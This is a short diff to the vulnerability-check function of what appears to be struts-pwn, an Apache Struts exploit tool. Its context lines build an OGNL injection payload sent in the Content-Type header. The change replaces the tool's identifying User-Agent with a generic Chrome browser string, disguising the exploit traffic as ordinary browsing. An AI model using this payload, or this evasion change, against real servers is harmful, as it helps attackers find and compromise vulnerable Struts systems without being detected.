@@ -108,7 +108,7 @@ def check(url):
     payload = '${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].'
     payload += "addHeader('%s','%s')}.multipart/form-data" % (random_string, random_string)
     headers = {
-        'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn)',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36',
         # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
         'Content-Type': str(payload),
         'Accept': '*/*'
